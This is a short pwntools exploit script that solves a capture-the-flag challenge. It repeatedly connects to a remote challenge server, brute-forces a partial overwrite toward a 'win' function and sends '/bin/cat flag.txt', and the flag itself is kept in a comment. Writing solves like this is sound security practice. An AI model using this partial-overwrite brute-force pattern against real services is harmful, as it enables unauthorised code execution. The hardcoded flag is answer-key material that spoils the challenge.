#!/usr/bin/env python3

from pwn import *

context.log_level = "critical"
elf = ELF("./pwnme", checksec=True)
context.binary = elf

while True:
    try:
        with remote("0.cloud.chals.io", 16612) as p:
            p.sendline(str(60).encode())
            p.sendline(str((elf.sym["win"] + 8) & 0xffff).encode())
            p.sendline(b"/bin/cat flag.txt")
            p.readline()
            p.readline()
            flag = p.readline()
            if b"udctf{" in flag:
                print(flag.decode()) # udctf{th3_0n3_1n_s1xt33n_pwn_str4t_FTW}
                break
    except:
        continue
